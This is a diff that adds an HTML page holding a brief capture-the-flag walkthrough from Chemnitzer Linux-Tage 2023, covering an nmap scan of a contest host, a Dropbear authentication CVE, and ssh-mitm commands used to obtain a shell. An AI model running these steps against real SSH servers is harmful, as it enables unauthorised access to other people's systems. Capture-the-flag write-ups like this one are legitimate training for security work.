@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <link rel="stylesheet" href="../style/ctf.css">
+        <script src="../script/pass.js"></script>
+        <link rel="icon" href="icon_ctf.png">
+        <title>Chemnitzer Linux-Tage 2023</title>
+    </head>
+    <body>
+        <details>
+            <summary>secunet</summary>
+            <ol>how to root@134.109.72.67<br>
+                <br>
+                nmap -p- 134.109.72.67
+                <ol>  PORT     STATE SERVICE VERSION<br>
+                  22/tcp   open  ssh     Dropbear sshd 2020.81 (protocol 2.0)<br>
+                  80/tcp   open  http    thttpd 2.25b 29dec2003<br>
+                  |_http-server-header: thttpd/2.25b 29dec2003<br>
+                  |_http-title: secunet Capture The Flag<br>
+                  | http-methods: <br>
+                  |_  Supported Methods: GET HEAD POST<br>
+                  8022/tcp open  ssh     Dropbear sshd 2020.81 (protocol 2.0)<br>
+                  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</ol>
+                <br>
+                http://134.109.72.67/t/*<br>
+                Downloads all files<br>
+                <br>
+                search CVE:
+                <ol>  https://www.cvedetails.com/cve/CVE-2021-36369/<br>
+                  https://docs.ssh-mitm.at/user_guide/trivialauth.html</ol>
+                <br>
+                get shell:
+                <ol>  wget https://github.com/ssh-mitm/ssh-mitm/releases/latest/download/ssh-mitm-x86_64.AppImage<br>
+                  chmod +x ssh-mitm*.AppImage<br>
+                  ./ssh-mitm-x86_64.AppImage server --remote-host 134.109.72.67<br>
+                  ssh -A -p 10022 localhost</ol>
+                <br>
+                I am in:
+                <ol>  whoami -> clt<br>
+                  cat /README
+                  <ol>Questions of the day:<br>
+                    1. How to make the kernel load the wireless stack?<br>
+                    2. How to create bonding interfaces via kernel pseudo filesystem?<br>
+                    3. How to use the suid flag of socat (once it's there)?
+                  </ol></ol>
+                <br>
+                End of time</ol>
+        </details>
+    </body>
+</html>
